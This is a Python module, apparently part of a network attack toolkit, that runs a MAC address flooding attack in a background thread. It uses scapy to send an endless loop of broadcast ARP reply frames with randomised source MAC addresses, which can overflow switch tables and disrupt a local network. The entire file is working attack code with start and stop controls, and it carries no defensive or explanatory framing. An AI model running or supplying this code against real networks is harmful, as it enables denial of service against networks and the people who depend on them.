from src.core import manager
from src.cli import parser

import threading
from scapy.all import RandMAC, Ether, sendp, ARP, Padding

def run():

    mac_address_flooding_attack_thread = MacAddressFloodingAttackThread()
    mac_address_flooding_attack_thread.daemon = True
    mac_address_flooding_attack_thread.start()

    return mac_address_flooding_attack_thread


class MacAddressFloodingAttackThread(threading.Thread):

    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        try:
            manager.attack_status = 'on'
            manager.attack_type = 'mac_address_flooding'

            vendor = "b8:e8:56:"
            while manager.attack_status == 'on' and manager.attack_type == 'mac_address_flooding':
                randMAC = vendor + ':'.join(RandMAC().split(':')[3:])
                sendp(Ether(src=randMAC ,dst="FF:FF:FF:FF:FF:FF") / ARP(op=2, psrc="0.0.0.0", hwdst="FF:FF:FF:FF:FF:FF") / Padding(load="X"*18),verbose=0)

        except Exception as e:
            manager.attack_status = f'error: {e}'
            manager.attack_type = ''
            return
        
        manager.attack_status = 'off'
        manager.attack_type = ''


    def stop(self):
        if manager.attack_status != 'on' or manager.attack_type != 'mac_address_flooding':
            return False
        elif manager.attack_status[:5] == 'error':
            return False

        manager.attack_status = 'off'
        manager.attack_type = ''

        self.join()

        return True

